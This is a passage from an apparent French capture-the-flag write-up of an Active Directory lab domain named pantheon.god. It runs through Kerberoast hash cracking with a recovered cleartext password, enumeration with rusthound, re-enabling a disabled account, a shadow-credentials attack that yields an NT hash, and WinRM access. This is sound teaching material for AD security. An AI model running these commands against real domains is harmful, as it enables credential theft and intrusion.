<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>LDAPS       192.168.56.11   636    PANTHEON-DC01    $krb5tgs$23$*smbscores$PANTHEON.GOD$pantheon.god/smbscores*$42bf39b969a8a888cc5b4b1fd4eb5cbd$e1850ad13e806adb8eb0cd6c6126bc2989c933eec4196d03812955970261ae096ec04b57e624b63d25eb69447345389b3208834f6421fd9009c34faa7f44e1f350083214e26dba82ff6b6773f7e648b9bac14fec93e26b561f2b4e961bf2d2e767b36da98e236a54ff7887c729e6cf26d5f0bc02a66ea6cd84c38dc2be93b0f2628186de5cca2b576f3c14d680032409d7c900b17262419ef2def0f6830487f19e4a5ae8cf6c3a4e2aaf896be48fa0e861ee59722a4599a34cd6d90071c5e47eb4349b6b16b19adb1990cafaee0df4b7363344479eba87af5e375771ace74fb1c5a979acbf5d107a55399bc4db96099a7d16482b1c550eaf704e7b9aaa9b319289da58e93e09c4a7a4582e648b4ddd02c59f98f53c5d2a672ef9c56abbbb2bac86902c9dd4bf8b5a3fa6c4180320c5a7fc5c0f45ee254964a3cb3d01d236784470bed8135c3c563809ca8510707790284b04b3ec6022d60a1c6f1910b4cb5da5ccdd109bd29fb0cc2f8a64db642d9cef0fed1915f43d80d2460ff20da29a1a2b9d355b713c3d3fd3beaaffeef0d3c9c23e8583e0aa4e04c31a769a2810f2edf98335f1b3cdcba422db5af41f8df99e56b1bd57dd7ea9b72c39edd7443ff8dda448ac6a119e26ec25fa50a3f1cf68206abd6dc447327faf993f78b922e69492d519ffda58655fcdbda660ced01cd5e49f83c541b251bc481f373164b355ca933a023639062daae4d9db6b14fb85c32afff3240d8358ece0ab8122737e5cb7b1bff3cf2ecb20684f78317078a5cfb602388908c2f0476e7f90114cc38d06addc9d897a43171c29a1b9bd8ddbbe2b8a8c12e7162aee168c402ec9cac65891ba8d2e3ff06036bae1eb532fba13fd0766b038c77bb1a3d1c130ade476142cb7a74acf2d73d2a9a28c6541aed0a3cb79df3f4c6342fb784cbc502c969b5f6c571a0c2388895977844cc46fc5c1b724b8ed596abe6711e47d6d37e48196b6dc42bf1af4e8c18c5c66a6cf41adf6e3f7c0ec2e5de7a8c6e396575e65459f66ef2e7437acd2de10a892c2611ebfc111d53c2a973a7930b6f12811532ecc4ccacd32c3bd5bad72c4ca75b947984bdd808c9a1ccfec1ddcea94dde2e338901801f3077f3bcc42d4bb4c75d30a4d21661a5e67d820241eef439dfbcf324df0747c000bc823ab91cd9e5edd78fcfaf585150a2bfadbe3535e3698c224cdab7f2cfefedf399d02359a990193b9d97907d95f223e425b59491e97c5129c7d002c4ed8e8ca63e591cf3c01109b72c49b25de0c7657935586cfec4fb75f13eba9a693db0c3f4b98388c72122a782198107a4e6d61365607f5c9b2f91b8a6f19316ed956fe952e597cc594cec8559afa9cb1431d14bd900a6a3e83e3234b434bdcd51b2862a69e7937fbda7aa70632df4c74f64c9348a2bfa7f126026a9e9a21bcc3513a7123abf3c8cdfd9739101bba3a4bf52d7c78922a6003ab7d5578aac44f1336ec1d81c34bff9c70f68f7932be19a65d5cf00b96286885a1017658f674a981d53ebb1e1e
<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>[smbscores@pantheon.god][Jun 22, 2025 - 23:40:12 (CEST)] exegol-pantheon_wu writeup #
</code></pre></div>
</li>
<li>
<p>On trouve effectivement que hercule est le seul utilisateur dont le <code>mdp</code> à pus être retrouver avec <code>hashcat</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>smbscores@pantheon.god][Jun 22, 2025 - 23:45:50 (CEST)] exegol-pantheon_wu scan # hashcat --hash-type 13100 --attack-mode 0 Kerberoastables.txt `fzf-wordlists`
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>hashcat (v6.2.6) starting
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>....
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>$krb5tgs$23$*hercule$PANTHEON.GOD$pantheon.god/hercule*$aa9ccd3d56303ff1475981267ff6a9b8$2f7bcb43d4d4587dbc1c625599553784d26a2347a5bd7a9f056b7e7d2b9f6d31bb93173e824ebcffed3e6b01103eb5a8e9827bd8455a373a50faa5fe0fd21725a0f2ae080a8e4c3fbaccfb41fc642f74e8238ff9b646718bcd59411926f2a6442a2d539440b0599f4fd3c7fb797332c7e09de70ada10af736cb837abc595a65cbe561b7fcc8c41aa2b2329af3eac8e5085e260d4c06fe622497a01383580801fb7152b3b90a04854b88dfe88a6ac472402c192b71c6b4b5bb5586ff655e4b54e713bb08ecb77dd50edd93f3a919df5ad700c54f20cb2647ef9f2fb997dd6627fcbd8c62b37e0da4cd4cb06d676ea48ad6628e3f52ef401e793b7b2049a2c8b068da21d377c8b41fa42aa22f37281f19c3aa4a45b26242669d32425f05b565e9f2a581ee45ca275101cb87fedb909a1c240480cfb8f0cb2d59ae4615ecb7ec30d6ca307a56d48ef022fa16f3b2e4abf4bf89060df5bc940ad1dff7f5d5419cd30c910360f830a493f6150f4651cd1b5a986f09b479c540ed1e0bcd86293e02e456181d2f59ec19a01f0396f3c56c72d75ee5a3d0394509bebc34f78f17c2f59a265eed0942bb08327b5d0074d7631e3bd13b5371e40b23ccf8f59ceb7a6ea2bd2f88673362442e62155452b19d3b88ee6c55a3970e73dd47c44f6b025bf4db0a226302d85f01403b2ea8ac0e5f04a94e0ab8a3de141342e3e62c8111ac6bacbb199970549916f814a1ddbad28c8e59deb989c7f22ddf207334a3e655ead0284a504c3ddfd5eca1491a1c10b0d1b60eaa1e2a4dddbec8ffa3262326091406e486682f3b46b0389ec7b42a7ee80c08552c83b9df8d7e72da16d8381bd65fcfe4a60e2a5214877573af59064d894b03236941ac851cb13ad54d2bbe6fd3220cf63f61cc14dfbbee922ded7613d373ca1f58912babadaaae4788fcdb5bf5c8109dd6695301bad72dec1364187ee2759b7743ed7340e960cdfe832dca8c12f055e970348704dfe6df3857c46132b126b44dd7b2c0e21452fdf6f88dba351ab4cc27f08eace50ed6e1eb564b61fddefa2f014ed6c76769078846726e3f596fc60269dc44f0038c575fac8ff5877583f1bb2463e3f4978c19396a4ca54c54896d0ceaf841d9354dbb3ae117816c51804d95fa2f4ede4c60d3a372b90cace99b26fbe92624da58676e68b4e15e4ed5e73178b73bb726f44609a60afbd6c461c6489d7119b9fc8babebb85285d0c75c05250cfd218fcafe07a2754e076b67033d3f4f32ebead3e97332569b48a2e0ccbaee31e5913d1886c2fc2e8982386feabdcaeb0f6b51273830ecd6cb85fbe0bcd237dbddebf029335fc24d90ccaa2faf86c7eb2981e2588039f3b5534ba1c48505fcabbd5678c1f8664f517f39c0de8ac3ed00f696ccecf01b36914a0c0bea2f804c540b0c8e460b16c7c7c9e16ccc365d788b2f59daff3abe406a9deea327424146091cda71d83327b5192113f5f644576b126121a5424a1a6da0e62de340f23f5c1e5631c876b578b6b02da43e3ad408e7124:Worksucks!
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>....
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>Stopped: Sun Jun 22 23:46:18 2025
</code></pre></div>
</li>
<li>
<p>Avec <code>rusthound</code> qui est un injestor bloodhound fait en rust on peut récupérer les information relative aux domain pour les lire sur <code>bloodhound</code> (<code>boodhound.py</code> ne fonctionne pas ici)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>rusthound -d &quot;$DOMAIN&quot; -u &quot;$USER&quot;@&quot;$DOMAIN&quot; -p &quot;$PASSWORD&quot; --zip --ldaps --adcs --old-bloodhound
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>---------------------------------------------------
<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>Initializing RustHound at 00:14:53 on 06/23/25
<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>Powered by g0h4n from OpenCyber
<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>---------------------------------------------------
<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>[2025-06-22T22:14:53Z INFO  rusthound] Verbosity level: Info
<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>[2025-06-22T22:14:53Z INFO  rusthound::ldap] Connected to PANTHEON.GOD Active Directory!
<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>[2025-06-22T22:14:53Z INFO  rusthound::ldap] Starting data collection...
<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>[2025-06-22T22:14:53Z INFO  rusthound::ldap] All data collected for NamingContext DC=pantheon,DC=god
<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>[2025-06-22T22:14:53Z INFO  rusthound::ldap] All data collected for NamingContext CN=Configuration,DC=pantheon,DC=god
<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>⢀ Parsing LDAP objects: 52%                                                                                                                                 [2025-06-22T22:14:53Z INFO  rusthound::modules::adcs::parser] Found 11 enabled certificate templates
<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::checker] Starting checker to replace some values...
<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::checker] Checking and replacing some values finished!
<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>[2025-06-22T22:14:53Z INFO  rusthound::modules] Starting checker for ADCS values...
<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>[2025-06-22T22:14:53Z ERROR rusthound::modules::adcs::checker] Couldn&#39;t connect to server http://pantheon-dc01.pantheon.god/certsrv/, please try manually and check for https access if EPA is enable.
<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>[2025-06-22T22:14:53Z INFO  rusthound::modules] Checking for ADCS values finished!
<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 35 users parsed!
<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 69 groups parsed!
<a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 2 computers parsed!
<a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 5 ous parsed!
<a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 1 domains parsed!
<a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 1 cas parsed!
<a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 33 templates parsed!
<a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 2 gpos parsed!
<a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 21 containers parsed!
<a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] .//20250623001453_pantheon-god_rusthound.zip created!
<a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a>
<a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a>RustHound Enumeration Completed at 00:14:53 on 06/23/25! Happy Graphing!
</code></pre></div>
</li>
</ul>
<p>On vois que notre utilisateur hercule est membre du groupe <code>OLYMPE-IMORTAL-HEROS</code> et que ce groupe à un generic  write sur plusieurs utilisateur fessant tous partie du groupe <code>TITANTS-BANNIS</code></p>
<p><img alt="image.png" src="../writeup_sources/image.png" /></p>
<p>Un des utilisateur de ce groupe est particulièrement intéressant car il fais partie du groupe <code>remote desktop users</code> et du groupe <code>remote management users</code> deux groupes ayant un droit d’accès a distance aux machine windows du domaine,</p>
<p><img alt="image.png" src="../writeup_sources/image%201.png" /></p>
<p>Étant donner qu’il y a un <code>ADCS</code> sur le <code>DC</code>, on peut récupérer un <code>TGT</code> et le hash de l’utilisateur <code>cronos</code> avec l’attaque <code>shadowcredential</code>  avec <code>bloodyAD+gettgtpkinit.py</code> ou simplement avec <code>certipy</code></p>
<p>Mais dans les deux cas on ce retrouve avec l’erreur suivante :</p>
<p><code>KDC_ERR_CLIENT_REVOKED Detail: "Client’s credentials have been revoked"</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>[hercule@pantheon.god][Jun 23, 2025 - 00:48:57 (CEST)] exegol-pantheon_wu bloodhound # certipy shadow auto -u &quot;$USER&quot;@&quot;$DOMAIN&quot; -p &quot;$PASSWORD&quot; -account &quot;$TargetUser&quot;
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>Certipy v4.8.2 - by Oliver Lyak (ly4k)
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>[*] Targeting user &#39;cronos&#39;
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>[*] Generating certificate
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>[*] Certificate generated
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>[*] Generating Key Credential
<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>[*] Key Credential generated with DeviceID &#39;e9474057-1a78-2009-8229-bacb5681ca2d&#39;
<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>[*] Adding Key Credential with device ID &#39;e9474057-1a78-2009-8229-bacb5681ca2d&#39; to the Key Credentials for &#39;cronos&#39;
<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>[*] Successfully added Key Credential with device ID &#39;e9474057-1a78-2009-8229-bacb5681ca2d&#39; to the Key Credentials for &#39;cronos&#39;
<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>[*] Authenticating as &#39;cronos&#39; with the certificate
<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>[*] Using principal: cronos@pantheon.god
<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>[*] Trying to get TGT...
<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>[*] Restoring the old Key Credentials for &#39;cronos&#39;
<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>[*] Successfully restored the old Key Credentials for &#39;cronos&#39;
<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>[*] NT hash for &#39;cronos&#39;: None
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>[hercule@pantheon.god][Jun 23, 2025 - 00:42:58 (CEST)] exegol-pantheon_wu bloodhound # bloodyAD -s --host &quot;$DC_IP&quot; -d &quot;$DOMAIN&quot; -u &quot;$USER&quot; -p &quot;$PASSWORD&quot; add shadowCredentials $TargetUser
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>[+] KeyCredential generated with following sha256 of RSA key: 4c6845977d25d5faa2c085eb0b4125977399c5f9905176713b85257adc71d61f
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>No outfile path was provided. The certificate(s) will be stored with the filename: zgmkD2Xx
<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>[+] Saved PEM certificate at path: zgmkD2Xx_cert.pem
<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>[+] Saved PEM private key at path: zgmkD2Xx_priv.pem
<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>Run the following command to obtain a TGT:
<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>python3 PKINITtools/gettgtpkinit.py -cert-pem zgmkD2Xx_cert.pem -key-pem zgmkD2Xx_priv.pem pantheon.god/cronos zgmkD2Xx.ccache
<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>[hercule@pantheon.god][Jun 23, 2025 - 00:43:29 (CEST)] exegol-pantheon_wu bloodhound # gettgtpkinit.py -cert-pem zgmkD2Xx_cert.pem -key-pem zgmkD2Xx_priv.pem pantheon.god/cronos zgmkD2Xx.ccache
<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>....
<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_CLIENT_REVOKED Detail: &quot;Client’s credentials have been revoked&quot;
<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>[hercule@pantheon.god][Jun 23, 2025 - 00:44:05 (CEST)] exegol-pantheon_wu bloodhound #
</code></pre></div>
<p>On comprend que le compte est desactiver et qu’il va falloire d’abord le réactiver affin de pouvoir l’utiliser, ce qui est possible avec <code>bloodyAD</code> par exemple :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>[hercule@pantheon.god][Jun 23, 2025 - 01:19:39 (CEST)] exegol-pantheon_wu bloodhound # bloodyAD --host &quot;$DC_IP&quot; -d &quot;$DOMAIN&quot; -u &quot;$USER&quot; -p &quot;$PASSWORD&quot; remove uac $TargetUser -f ACCOUNTDISABLE
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>[-] [&#39;ACCOUNTDISABLE&#39;] property flags removed from cronos&#39;s userAccountControl
</code></pre></div>
<ul>
<li>
<p>Ainsi maintenant que le compte est réactiver, on peut l’utiliser pour effectuer notre attaque <code>shadowcredentials</code> et récupérer le hash de cette utilisateur</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>[hercule@pantheon.god][Jun 23, 2025 - 01:19:41 (CEST)] exegol-pantheon_wu bloodhound # faketime &quot;$(rdate -n $IP -p | awk &#39;{print $2, $3, $4}&#39; | date -f - &quot;+%Y-%m-%d %H:%M:%S&quot;)&quot; zsh
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>[hercule@pantheon.god][Jun 23, 2025 - 01:19:54 (CEST)] exegol-pantheon_wu bloodhound # certipy shadow auto -u &quot;$USER&quot;@&quot;$DOMAIN&quot; -p &quot;$PASSWORD&quot; -account &quot;$TargetUser&quot;
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>Certipy v4.8.2 - by Oliver Lyak (ly4k)
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>[*] Targeting user &#39;cronos&#39;
<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>[*] Generating certificate
<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>[*] Certificate generated
<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>[*] Generating Key Credential
<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>[*] Key Credential generated with DeviceID &#39;4db42bb3-8180-1c94-cfd4-104cb704ffea&#39;
<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>[*] Adding Key Credential with device ID &#39;4db42bb3-8180-1c94-cfd4-104cb704ffea&#39; to the Key Credentials for &#39;cronos&#39;
<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>[*] Successfully added Key Credential with device ID &#39;4db42bb3-8180-1c94-cfd4-104cb704ffea&#39; to the Key Credentials for &#39;cronos&#39;
<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>[*] Authenticating as &#39;cronos&#39; with the certificate
<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>[*] Using principal: cronos@pantheon.god
<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>[*] Trying to get TGT...
<a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>[*] Got TGT
<a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a>[*] Saved credential cache to &#39;cronos.ccache&#39;
<a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>[*] Trying to retrieve NT hash for &#39;cronos&#39;
<a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>[*] Restoring the old Key Credentials for &#39;cronos&#39;
<a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a>[*] Successfully restored the old Key Credentials for &#39;cronos&#39;
<a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a>[*] NT hash for &#39;cronos&#39;: d903644e45874322d8403de4c267ba64
<a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a>[hercule@pantheon.god][Jun 23, 2025 - 01:19:59 (CEST)] exegol-pan
</code></pre></div>
</li>
</ul>
<p>On confirme qu’il peut bien utiliser win-rm sur le dc</p>
<p><img alt="image.png" src="../writeup_sources/image%202.png" /></p>
<ul>
<li>
<p>Une fois connecter en tant que cronos, on remarque un répertoire peux habituel <code>coliseum</code> qui appartient à l’utilisateur <code>athena</code> et sur le quel nous avons tout les droits :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>*Evil-WinRM* PS C:\Users\cronos\Documents&gt; ls /
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>    Directory: C:\
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>Mode                 LastWriteTime         Length Name
<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>----                 -------------         ------ ----
<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>d-----         6/21/2025   7:38 PM                coliseum
<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>d-----         6/10/2025   4:36 AM                inetpub
<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>d-----          4/1/2024   7:02 AM                PerfLogs
<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>d-r---         6/10/2025   4:21 AM                Program Files
<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>d-r---          4/1/2024   8:16 AM                Program Files (x86)
<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>d-----         6/21/2025   7:37 PM                shares
<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>d-r---         6/22/2025  11:26 PM                Users
<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>d----l         6/21/2025   7:05 PM                vagrant
<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>d-----         6/21/2025   7:31 PM                Windows
<a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>d-----         6/10/2025   2:15 PM                Windows.old
<a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a>
<a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a>*Evil-WinRM* PS C:\Users\cronos\Documents&gt;
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>*Evil-WinRM* PS C:\coliseum&gt; icacls &quot;C:/coliseum/&quot;
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>C:/coliseum/ BUILTIN\Administrators:(F)
<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>             PANTHEON\cronos:(OI)(CI)(F)
<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>             BUILTIN\Administrators:(I)(OI)(CI)(F)
<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>             BUILTIN\Users:(I)(OI)(CI)(RX)
<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>             BUILTIN\Users:(I)(CI)(AD)
<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>             BUILTIN\Users:(I)(CI)(WD)
<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>             PANTHEON\athena:(I)(F)
<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a>             CREATOR OWNER:(I)(OI)(CI)(IO)(F)
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a> $path = &quot;C:\coliseum&quot;
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>(Get-Acl -Path $path).Access
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>...
<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>FileSystemRights  : FullControl
<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>AccessControlType : Allow
<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>IdentityReference : PANTHEON\cronos
<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>IsInherited       : False
<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>InheritanceFlags  : ContainerInherit, ObjectInherit
<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>PropagationFlags  : None
<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>...
<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>FileSystemRights  : FullControl
<a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>AccessControlType : Allow
<a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>IdentityReference : PANTHEON\athena
<a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>IsInherited       : True
<a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>InheritanceFlags  : None
<a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a>PropagationFlags  : None
<a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a>
<a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>FileSystemRights  : 268435456
<a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a>AccessControlType : Allow
<a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a>IdentityReference : CREATOR OWNER
<a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a>IsInherited       : True
<a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a>InheritanceFlags  : ContainerInherit, ObjectInherit
<a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a>PropagationFlags  : InheritOnly
</code></pre></div>
</li>
<li>
